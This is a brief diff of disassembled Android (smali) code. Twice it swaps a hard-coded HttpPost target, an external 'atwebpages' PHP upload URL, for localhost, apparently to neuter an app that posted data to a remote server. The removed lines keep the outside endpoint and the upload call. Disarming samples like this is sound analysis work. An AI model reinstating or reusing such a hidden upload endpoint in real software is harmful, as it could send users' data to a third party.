@@ -556,7 +556,7 @@
 
     move-object/from16 v37, v44
 
-    const-string v38, "http://at0m.atwebpages.com/file.php"
+    const-string v38, "http://localhost/file.php"
 
     invoke-direct/range {v37 .. v38}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
 
@@ -664,7 +664,7 @@
 
     move-object/from16 v37, v44
 
-    const-string v38, "http://at0m.atwebpages.com/file.php"
+    const-string v38, "http://localhost/file.php"
 
     invoke-direct/range {v37 .. v38}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
 
